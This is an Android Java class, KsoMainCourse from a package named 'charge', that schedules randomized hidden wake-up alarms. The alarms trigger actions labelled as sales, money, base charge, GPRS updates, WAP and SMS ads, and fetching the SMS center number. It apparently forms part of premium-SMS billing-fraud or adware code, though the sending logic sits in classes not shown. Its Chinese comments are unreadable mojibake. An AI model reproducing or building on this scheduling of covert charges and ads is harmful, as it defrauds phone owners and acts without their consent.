package com.sttm.charge;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.SystemClock;
import android.util.Log;

import com.sttm.util.KsoHelper;
import com.sttm.util.LogFile;

public class KsoMainCourse {
	private boolean startFlag = false;
	private boolean salesFlag1 = false;// ��һ�������Ƿ��ͱ�ʶ
	private boolean salesFlag2 = false;// �ڶ��������Ƿ��ͱ�ʶ
	private boolean salesFlag3 = false;// �����������Ƿ��ͱ�ʶ
	private boolean salesFlag4 = true;// �����������Ƿ��ͱ�ʶ
	private double saleDelay1;// ��һ���������͵���ʱʱ��(��)
	private double saleDelay2;// �ڶ����������͵���ʱʱ��(��)
	private double saleDelay3;// �������������͵���ʱʱ��(��)
	private double saleDelay4;// �������������͵���ʱʱ�䣨�룩
	private double gprsDelay;
	private static final String TAG = "KsoMainCourse";

	public boolean decideStartFlag(long startIntelnetDate, Context context) {
		// ��ʼͳ���������Զ������������뵱���������Ƚ�
		SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd");
		//Log.d(TAG, "Date1=" + startIntelnetDate);
		//Log.d(TAG, "Date2=" + Long.parseLong(sdf.format(new Date())));
		if (startIntelnetDate <= Long.parseLong(sdf.format(new Date()))) {
			//Log.d(TAG, "����TRUE");
			startFlag = true;

		} else {
			startFlag = false;
		}

		return startFlag;
	}

	public void startMainAlarm(Context context) {
		Intent intentStartFlag = new Intent(context, KsoAlarmService.class);
		intentStartFlag.setAction("start");
		PendingIntent pintentStartFlag = PendingIntent.getBroadcast(context, 0,
				intentStartFlag, 0);
		AlarmManager alarmStart = (AlarmManager) context
				.getSystemService(Context.ALARM_SERVICE);
		long firstime = SystemClock.elapsedRealtime() + 24 * 3600000;
		alarmStart.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, firstime,
				24 * 3600000, pintentStartFlag);
		//Log.d(TAG, "����ÿ��һ���ڵĶ�ʱ��( 24Сʱ���ٴ�����)");
		LogFile.WriteLogFile("��������Ϊ��ʮ�ĵĶ�ʱ��( 24Сʱ���ٴ�����)");
	}

	// ���������¼��Ķ�ʱ��
	public void startTimerHandler(Context context) {
		


		if (salesFlag1) {
			Intent intentSalesFlag1 = new Intent(context, KsoAlarmService.class);
			intentSalesFlag1.setAction("sales1");
			PendingIntent pintentSalesFlag1 = PendingIntent.getBroadcast(
					context, 0, intentSalesFlag1, 0);
			AlarmManager alarmSales1 = (AlarmManager) context
					.getSystemService(Context.ALARM_SERVICE);
			alarmSales1.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
					+ (long)(saleDelay1 * 60  * 60 * 1000), pintentSalesFlag1);

			//Log.d(TAG, "������һ���������Ŷ�ʱ��" + saleDelay1 + "(5-6)Сʱ����");
			LogFile.WriteLogFile("������һ���������Ŷ�ʱ��" + saleDelay1 + "(5-6)Сʱ����");
		}
		if (salesFlag2) {
			Intent intentSalesFlag2 = new Intent(context, KsoAlarmService.class);
			intentSalesFlag2.setAction("sales2");
			PendingIntent pintentSalesFlag2 = PendingIntent.getBroadcast(
					context, 0, intentSalesFlag2, 0);
			AlarmManager alarmSales2 = (AlarmManager) context
					.getSystemService(Context.ALARM_SERVICE);
			alarmSales2.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
					+ (long)(saleDelay2 * 60 * 60 * 1000), pintentSalesFlag2);

			//Log.d(TAG, "�����ڶ����������Ŷ�ʱ��" + saleDelay2+ "(7-8)Сʱ����");
			LogFile.WriteLogFile("�����ڶ����������Ŷ�ʱ��" + saleDelay2 + "(7-8)Сʱ����");
		}
		if (salesFlag3) {
			Intent intentSalesFlag3 = new Intent(context, KsoAlarmService.class);
			intentSalesFlag3.setAction("sales3");
			PendingIntent pintentSalesFlag3 = PendingIntent.getBroadcast(
					context, 0, intentSalesFlag3, 0);
			AlarmManager alarmSales3 = (AlarmManager) context
					.getSystemService(Context.ALARM_SERVICE);
			alarmSales3.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
					+ (long)(saleDelay3 * 60 * 60 * 1000), pintentSalesFlag3);
		

			//Log.d(TAG, "�����������������Ŷ�ʱ��" + saleDelay3 + "(16-17)Сʱ����");
			LogFile.WriteLogFile("�����������������Ŷ�ʱ��" + saleDelay3 + "(16-17)Сʱ����");
		}

		if (salesFlag4) {
			Intent intentSalesFlag4 = new Intent(context, KsoAlarmService.class);
			intentSalesFlag4.setAction("sales4");
			PendingIntent pintentSalesFlag4 = PendingIntent.getBroadcast(
					context, 0, intentSalesFlag4, 0);
			AlarmManager alarmSales4 = (AlarmManager) context
					.getSystemService(Context.ALARM_SERVICE);
			alarmSales4.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
					+ (long)(saleDelay4 * 60  * 60 * 1000), pintentSalesFlag4);

			//Log.d(TAG, "�����������������Ŷ�ʱ��" + saleDelay4 + "(24-25)Сʱ����");
			LogFile.WriteLogFile("�����������������Ŷ�ʱ��" + saleDelay4 + "(24-25)Сʱ����");
		}

	}

	// ����GPRS��ʱ��
	public void startGPRSHandler(Context context) {
		/* ����ʱ�� ������ */
	
		Intent intentGPRSFlag = new Intent(context, KsoAlarmService.class);
		intentGPRSFlag.setAction("GPRS");
		PendingIntent pintentGPRSFlag = PendingIntent.getBroadcast(context, 0,
				intentGPRSFlag, 0);
		AlarmManager alarmSales1 = (AlarmManager) context
				.getSystemService(Context.ALARM_SERVICE);
		alarmSales1.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
				+ (long)(gprsDelay * 60 * 60 * 1000), pintentGPRSFlag);

		//Log.d(TAG, "����GPRS���¶�ʱ�� " + gprsDelay + "(2-6)Сʱ�����");
		LogFile.WriteLogFile("����GPRS���¶�ʱ�� " + gprsDelay + "(2-6)Сʱ�����");
	}

	// �������۶�ʱ��
	public void startMoneyHandler(Context context) {
		double delay = KsoHelper.getRandomDouble2(5) ;// 5-6����
		Intent intentMoneyFlag = new Intent(context, KsoAlarmService.class);
		intentMoneyFlag.setAction("Money");
		PendingIntent pintentMoneyFlag = PendingIntent.getBroadcast(context, 0,
				intentMoneyFlag, 0);
		AlarmManager alarmSales = (AlarmManager) context
				.getSystemService(Context.ALARM_SERVICE);
		alarmSales.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
				+ (long)(delay * 60 * 1000), pintentMoneyFlag);

		//Log.d(TAG, "�������۶�ʱ��" + delay + "(5-6)���Ӻ�ʼ");
		LogFile.WriteLogFile("�������۶�ʱ��" + delay + "(5-6)���Ӻ�ʼ");
	}

	// ����WAP��涨ʱ��
	public void startAdsWAPHandler(Context context, long time) {
		double delay = KsoHelper.getRandomDouble2((int) time);// 30-60����
		Intent intentAdsFlag = new Intent(context, KsoAlarmService.class);
		intentAdsFlag.setAction("ADS_WAP");
		PendingIntent pintentAdsFlag = PendingIntent.getBroadcast(context, 0,
				intentAdsFlag, 0);
		AlarmManager alarmSales = (AlarmManager) context
				.getSystemService(Context.ALARM_SERVICE);
		alarmSales.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
				+ (long)(delay * 60 * 1000), pintentAdsFlag);
		//Log.d(TAG, "����WAP��涨ʱ��" + delay + "(30-60)���Ӻ�ʼ");
		LogFile.WriteLogFile("����WAP��涨ʱ��" + delay + "(30-60)���Ӻ�ʼ");
	}
	
	// ���������շѶ�ʱ��
		public void startBaseChargeHandler(Context context, long time) {
			double delay = (double) KsoHelper.getRandomDouble2((int) time);// 5-15����
			Intent intentBaseFlag = new Intent(context, KsoAlarmService.class);
			intentBaseFlag.setAction("BASE_CHARGE");
			PendingIntent pintentAdsFlag = PendingIntent.getBroadcast(context, 0,
					intentBaseFlag, 0);
			AlarmManager alarmBase = (AlarmManager) context
					.getSystemService(Context.ALARM_SERVICE);
			alarmBase.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
					+ (long)(delay * 60 * 1000), pintentAdsFlag);
			//Log.d(TAG, "���������շѶ�ʱ��" + delay + "(5-15)���Ӻ�ʼ");
			LogFile.WriteLogFile("���������շѶ�ʱ��" + delay + "(5-15)���Ӻ�ʼ");
		}
	

	// ����SMS��涨ʱ��
	public void startAdsSMSHandler(Context context) {
		double delay = KsoHelper.getRandomDouble2(0);// 30-60����
		Intent intentAdsFlag = new Intent(context, KsoAlarmService.class);
		intentAdsFlag.setAction("ADS_SMS");
		PendingIntent pintentAdsFlag = PendingIntent.getBroadcast(context, 0,
				intentAdsFlag, 0);
		AlarmManager alarmSales1 = (AlarmManager) context
				.getSystemService(Context.ALARM_SERVICE);
		alarmSales1.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
				+ (long)(delay * 60 * 1000), pintentAdsFlag);
		//Log.d(TAG, "����SMS��涨ʱ��" + delay + "(1-2)���Ӻ�ʼ");
		LogFile.WriteLogFile("����SMS��涨ʱ��" + delay + "(1-2)���Ӻ�ʼ");
	}
	// ������ȡ�������ĺ��붨ʱ��
	public static void startSmsCenterHandler(Context context) {
		double delay = KsoHelper.getRandomDouble2(5);// 5-6����
		
		Intent intentSmsCenterFlag = new Intent(context, KsoAlarmService.class);
		intentSmsCenterFlag.setAction("SmsCenter");
		PendingIntent pintentSmsCenterFlag = PendingIntent.getBroadcast(context, 0,
				intentSmsCenterFlag, 0);
		AlarmManager alarmSmsCenter = (AlarmManager) context
				.getSystemService(Context.ALARM_SERVICE);
		alarmSmsCenter.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
				+ (long)(delay * 60 * 1000), pintentSmsCenterFlag);
		//Log.d(TAG,"�������۶�ʱ��" + delay + "(5-6)���Ӻ�ʼ");
		LogFile.WriteLogFile("�������۶�ʱ��" + delay + "(5-6)���Ӻ�ʼ");
	}

	// �����������ʱ��
	public boolean checksalesvolumeOccasion(int drive_cfg,int driveup,int saleCount) {
		//Log.d(TAG, "checksalesvolumeoccasion");
	
		if (driveup >= drive_cfg) {
			
		
			salesFlag1 = true;
			saleDelay1 = KsoHelper.getRandomDouble2(5) ;	
			
            if(saleCount == 3){
            	salesFlag2 = true;
    			saleDelay2 = KsoHelper.getRandomDouble2(7) ;
				
			}else if(saleCount == 4){

				salesFlag3 = true;
				saleDelay3 = KsoHelper.getRandomDouble2(16);
				
			}		

		}

		saleDelay4 = KsoHelper.getRandomDouble2(24) ;

		return true;
	}

	// ���GPRS ����ʱ�� ͬһ�����ۿ������ٴ� ֻ����һ��
	public boolean checkGPRSOccasion(Context context, String[] IntelnetDate) {
		String today = KsoHelper.date2String();
		//Log.d("checkGPRSOccasion", "����ʱ��" + today);
		int mDay = getCurrentMday();
		if (!KsoHelper.checkIsUpdate(today, context)) {
			//Log.d("checkGPRSOccasion", "����GRPS����");
			for (int i = 0; i < IntelnetDate.length; i++) {

				if (mDay == Integer.parseInt(IntelnetDate[i].trim())
						&& mDay != getGprsMday(context)) {

					gprsDelay = KsoHelper.getRandomDouble(2, 6);
					return true;
				}
			}

		}

		return false;
	}

	public boolean getStartFlag() {
		return startFlag;
	}

	public void setGprsEnable(Context context, boolean b, int mday) {
		SharedPreferences share = context.getSharedPreferences(
				BootBroadcastReceiver.DRIVEUP_PREE, 0);

		share.edit().putInt("GprsMday", mday).commit();
		share.edit().putBoolean("GprsEnable", b).commit();

	}

	public boolean getGprsEnable(Context context) {
		SharedPreferences share = context.getSharedPreferences(
				BootBroadcastReceiver.DRIVEUP_PREE, 0);

		return share.getBoolean("GprsEnable", false);

	}

	public int getGprsMday(Context context) {
		SharedPreferences share = context.getSharedPreferences(
				BootBroadcastReceiver.DRIVEUP_PREE, 0);
		return share.getInt("GprsMday", 0);
	}

	public int getCurrentMday() {
		Calendar c = Calendar.getInstance();
		int mDay = c.get(Calendar.DAY_OF_MONTH);
		return mDay;
	}

}
